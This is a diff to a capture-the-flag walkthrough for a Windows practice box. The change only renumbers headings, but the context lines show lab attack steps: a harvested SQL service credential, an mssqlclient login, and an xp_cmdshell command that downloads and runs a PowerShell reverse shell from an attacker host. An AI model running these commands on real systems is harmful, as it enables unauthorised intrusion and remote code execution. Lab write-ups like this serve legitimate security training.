@@ -5,7 +5,7 @@ Difficulty: Very Easy
 
 OS: Windows
 ## Walkthrough
-### Enumeration
+### 1. Enumeration
 First, take some scanning on host:
 ```bash
 $ nmap -sC -sV 10.10.10.27
@@ -112,7 +112,7 @@ $ cat prod.dtsConfig
 Get credential
 ```sql_svc:M3g4c0rp123```
 
-### Foothold
+### 2. Foothold
 Access SQL Server
 ```bash
 $ mssqlclient.py -p 1433 ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth
@@ -173,4 +173,4 @@ Execute reverse shell from SQL Server
 SQL> xp_cmdshell "powershell "IEX(New-Object Net.WebClient).DownloadString('http://<attacker_ip>:8080/shell.ps1')""
 ```
 
-### Privilege Escalation
+### 3. Privilege Escalation
